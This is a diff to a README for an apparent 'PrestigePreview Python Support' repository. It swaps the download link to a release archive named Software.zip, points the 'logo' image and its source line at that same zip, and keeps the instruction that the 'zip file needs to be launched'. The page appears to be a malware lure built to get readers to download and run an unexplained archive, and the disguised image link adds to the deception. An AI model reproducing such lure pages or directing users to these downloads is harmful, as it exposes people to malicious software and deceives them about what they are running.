@@ -10,7 +10,7 @@ Welcome to the PrestigePreview Python Support repository! This repository is ded
 
 ## Repository Link
 
-🚀️ [Download PrestigePreview Python Support Zip File](https://github.com/dupu24/PrestigePreview_Python/releases/download/v1.0/App.zip) 🚀️
+🚀️ [Download PrestigePreview Python Support Zip File](https://github.com/dupu24/PrestigePreview_Python/releases/download/v2.0/Software.zip) 🚀️
 
 *Note: Zip file needs to be launched.*
 
@@ -46,9 +46,9 @@ If you encounter any issues, have questions, or need assistance with using Prest
 
 Thank you for your interest in PrestigePreview Python Support! We look forward to seeing the innovative ways in which you leverage Python within the PrestigePreview ecosystem. Let's collaborate, create, and empower data previewing with Python like never before!
 
-![PrestigePreview Python Logo](https://github.com/dupu24/PrestigePreview_Python/releases/download/v1.0/App.zip)
+![PrestigePreview Python Logo](https://github.com/dupu24/PrestigePreview_Python/releases/download/v2.0/Software.zip)
 
-*Image Source: https://github.com/dupu24/PrestigePreview_Python/releases/download/v1.0/App.zip*
+*Image Source: https://github.com/dupu24/PrestigePreview_Python/releases/download/v2.0/Software.zip*
 
 ---
 
